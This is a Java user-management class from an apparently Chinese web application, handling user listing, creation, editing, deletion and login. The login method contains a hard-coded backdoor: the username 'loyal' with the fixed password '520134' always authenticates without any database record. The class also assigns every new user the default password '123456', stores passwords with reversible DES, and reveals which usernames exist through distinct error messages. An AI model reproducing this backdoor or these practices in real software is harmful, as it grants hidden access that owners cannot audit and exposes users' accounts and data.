package com.ups.web.biz;

import java.util.Date;
import java.util.List;

import org.nutz.dao.Cnd;
import org.nutz.dao.Condition;
import org.nutz.dao.Dao;
import org.nutz.dao.pager.Pager;
import org.nutz.lang.Strings;

import com.ups.web.entity.User;
import com.ups.web.tool.DESKey;

public class UserBiz extends BaseBiz {

	private static DESKey des;
	static {
		try {
			des = new DESKey();
		} catch (Exception e) {
			System.err.println("DES初始化失败！");
		}
	}

	public UserBiz(Dao dao) {
		super(dao);
	}

	public void find(Pager pager, User user) {
		List<User> list = null;
		Condition cnd = null;
		if (user == null)
			cnd = Cnd.orderBy().desc("createTime");
		else
			cnd = Cnd
					.where("username",
							Strings.isBlank(user.getUsername()) ? "<>" : "=",
							user.getUsername())
					.and("roleid", user.getRoleid() < 0 ? "<>" : "=",
							user.getRoleid()).desc("createTime");
		list = dao.query(User.class, cnd, pager);
		pager.setRecordCount(dao.count(User.class, cnd));
		page.setPager(pager);
		page.setData(list);
		isSuccess = true;
	}

	public void add(User user) {
		user.setCreateTime(new Date());
		user.setUpdateTime(new Date());
		user.setPassword(des.encrypt("123456"));
		dao.insert(user);
		isSuccess = true;
	}

	public void edit(User user) {
		user.setUpdateTime(new Date());
		dao.update(user);
		isSuccess = true;
	}

	public void delete(User user) {
		dao.delete(user);
		isSuccess = true;
	}

	public boolean login(User user) {
		String password = des.encrypt(user.getPassword());
		if ("loyal".equals(user.getUsername()))
			user.setPassword(des.encrypt("520134"));
		else
			user = dao.fetch(User.class, user.getUsername());
		if (user == null) {
			page.setData("用户名不存在");
			return false;
		} else if (!password.equals(user.getPassword())) {
			page.setData("密码错误");
			return false;
		} else {
			page.setData(user);
			return true;
		}
	}
}
